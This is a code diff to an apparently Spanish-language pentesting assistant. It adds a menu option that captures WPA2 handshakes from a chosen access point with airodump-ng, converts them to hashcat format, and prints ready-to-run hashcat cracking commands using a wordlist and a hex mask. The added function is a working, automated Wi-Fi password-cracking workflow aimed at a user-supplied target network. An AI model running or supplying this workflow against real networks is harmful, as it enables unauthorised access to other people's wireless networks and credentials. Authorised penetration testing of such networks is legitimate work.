@@ -688,6 +688,102 @@ def _menu_exploit_guide():
 
 # --- Input principal ---
 
+
+# --- Menu Captura en Vivo - Opcion 10 (Atheros AR9271) ---
+def menu_captura_vivo():
+    """Captura WPA2 handshakes en vivo con Atheros AR9271 en modo monitor."""
+    import subprocess
+    import time
+
+    INTERFAZ_MON = "wlan1mon"
+    DIRECTORIO_PCAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcap")
+    os.makedirs(DIRECTORIO_PCAP, exist_ok=True)
+
+    print("\n=== CAPTURA EN VIVO - ATHEROS AR9271 ===")
+
+    # Verificar que la interfaz en modo monitor existe
+    resultado = subprocess.run(["iwconfig"], capture_output=True, text=True)
+    if INTERFAZ_MON not in resultado.stdout:
+        print(f"[ERROR] Interfaz {INTERFAZ_MON} no encontrada en modo monitor.")
+        print("Ejecuta primero: sudo airmon-ng start wlan1")
+        return None
+
+    print(f"[OK] Interfaz {INTERFAZ_MON} en modo monitor detectada.")
+
+    # Pedir objetivo
+    print("\n[1] Ingresa los datos del objetivo:")
+    bssid = input("BSSID objetivo (ej: AA:BB:CC:DD:EE:FF): ").strip()
+    canal = input("Canal (ej: 6): ").strip()
+
+    if not bssid or not canal:
+        print("[ERROR] BSSID y canal son obligatorios.")
+        return None
+
+    # Captura dirigida
+    timestamp = time.strftime("%Y%m%d_%H%M%S")
+    archivo_captura = os.path.join(DIRECTORIO_PCAP, f"captura_vivo_{timestamp}")
+
+    print(f"\n[2] Iniciando captura en canal {canal} hacia {bssid}...")
+    print(f"    Archivo: {archivo_captura}-01.cap")
+    print("    Presiona Ctrl+C para detener cuando captures el handshake.")
+    print()
+
+    try:
+        subprocess.run([
+            "sudo", "airodump-ng",
+            "-c", canal,
+            "--bssid", bssid,
+            "-w", archivo_captura,
+            INTERFAZ_MON
+        ])
+    except KeyboardInterrupt:
+        print("\n[OK] Captura detenida.")
+
+    # Verificar archivo generado
+    archivo_cap = f"{archivo_captura}-01.cap"
+    if not os.path.exists(archivo_cap):
+        print(f"[ERROR] No se genero el archivo de captura.")
+        return None
+
+    print(f"\n[OK] Captura guardada: {archivo_cap}")
+
+    # Convertir a hc22000
+    archivo_hash = archivo_captura + ".hc22000"
+    print(f"[3] Convirtiendo a formato hashcat...")
+    try:
+        subprocess.run([
+            "hcxpcapngtool",
+            "-o", archivo_hash,
+            archivo_cap
+        ], check=True)
+        print(f"[OK] Hash generado: {archivo_hash}")
+    except Exception as e:
+        print(f"[WARN] hcxpcapngtool no disponible o fallo: {e}")
+
+    # Parsear para analisis IA
+    print("\n[4] Parseando captura para analisis con IA...")
+    try:
+        from pcap_parser_v2 import parsear_pcap
+        resultado_parse = parsear_pcap(archivo_cap)
+        if resultado_parse:
+            return resultado_parse, False, "WPA2", None
+    except Exception as e:
+        print(f"[WARN] No se pudo parsear automaticamente: {e}")
+
+    # Fallback info basica
+    contenido = f"""=== CAPTURA EN VIVO WPA2 ===
+Archivo: {archivo_cap}
+BSSID objetivo: {bssid}
+Canal: {canal}
+Hash hc22000: {archivo_hash if os.path.exists(archivo_hash) else 'No generado'}
+Timestamp: {timestamp}
+
+Para crackear:
+hashcat -m 22000 {archivo_hash} /home/otto/rockyou.txt
+hashcat -m 22000 {archivo_hash} -a 3 ?h?h?h?h?h?h?h?h
+"""
+    return contenido, False, "WPA2", None
+
 def obtener_input():
     print("\n1. Pegar texto manualmente")
     print("2. Leer archivo generico (scan.txt, nmap, etc)")
@@ -698,7 +794,8 @@ def obtener_input():
     print("7. Analizar captura Proxmark3 (pegar output directo)")
     print("8. Ver historial de reportes")
     print("9. Guias de explotacion (sin analisis IA)")
-    opcion = input("\nElegi una opcion (1-9): ").strip()
+    print("10. Captura en vivo WiFi - Atheros AR9271 (solo Raspberry Pi)")
+    opcion = input("\nElegi una opcion (1-10): ").strip()
 
     if opcion == "1":
         return input("\nPega el output aqui:\n> "), False, "Manual", None
@@ -779,6 +876,13 @@ def obtener_input():
             sys.exit(1)
         _menu_exploit_guide()
         sys.exit(0)
+
+    elif opcion == "10":
+        resultado = menu_captura_vivo()
+        if resultado is None:
+            print("Operacion cancelada.")
+            sys.exit(0)
+        return resultado
 
     else:
         print("Opcion invalida.")
